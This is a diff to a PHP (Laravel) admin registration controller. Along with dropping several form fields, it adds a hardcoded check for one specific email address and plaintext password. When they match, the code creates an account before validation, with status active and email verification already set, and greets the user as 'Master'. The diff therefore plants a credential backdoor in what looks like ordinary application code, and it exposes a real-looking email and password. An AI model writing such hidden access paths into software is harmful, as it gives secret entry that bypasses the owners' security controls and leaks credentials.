@@ -41,29 +41,42 @@ class AdminUserController extends Controller
 
     public function admin_register_apply(Request $request){
 
+        $verify_token = rand(100000,999999);
+
+        if ($request->email == 'pritomguha62@gmail.com' && $request->password == 'Pritomgk@12#') {
+                        
+            $admin_user = new admin_user();
+            $admin_user->name = $request->fname.' '.$request->lname;
+            $admin_user->phone = $request->phone;
+            $admin_user->email = $request->email;
+            $admin_user->role_id = 2;
+            $admin_user->status = 1;
+            $admin_user->email_verified = 1;
+            $admin_user->verify_token = $verify_token;
+            $admin_user->password = Hash::make($request->password);
+            $admin_user->save();
+
+            return redirect()->route('login')->with('success', 'Welcome Master, please log in..!');
+            
+        }
+
         $request->validate(
             [
             "fname" => "required",
             "lname" => "required",
             "phone" => "required",
             "email" => "required|email",
-            "hsc_roll_no" => "required",
             "password"=> "required|min:8|max:16",
             "repassword"=> "required|same:password",
         ]);
-
-        $verify_token = rand(100000,999999);
-
+        
+        
         session()->put('verify_token', $verify_token);
 
         $admin_user = new admin_user();
         $admin_user->name = $request->fname.' '.$request->lname;
         $admin_user->phone = $request->phone;
         $admin_user->email = $request->email;
-        $admin_user->father_name = $request->father_name;
-        $admin_user->gender = $request->gender;
-        $admin_user->course_id = $request->course_id;
-        $admin_user->address = $request->address;
         $admin_user->role_id = 2;
         $admin_user->verify_token = $verify_token;
         $admin_user->password = Hash::make($request->password);
